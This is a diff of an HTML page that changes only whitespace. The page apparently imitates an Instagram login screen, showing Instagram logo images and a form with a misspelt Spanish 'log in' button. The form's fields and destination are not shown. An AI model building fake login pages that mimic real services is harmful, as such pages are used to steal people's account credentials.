@@ -1,8 +1,7 @@
-<!DOCTYPE html> 
+
 <html>
 <head>
     <meta charset="utf-8" />
-    
 </head>
 <body>
     <img width="1000px" src="https://assets.turbologo.com/blog/es/2019/09/19133022/instagram-logo-illustration.png" />
@@ -17,10 +16,6 @@
     <br/>
     <input type="submit" value="inicar sesion" />
 </form>
-
-
-
-
 <img width="1000px" src="https://static.vecteezy.com/ti/vettori-gratis/p1/4263118-meta-instagram-icon-set-editorial-metaverse-concept-gratuito-vettoriale.jpg" />
 </body>
 </html>
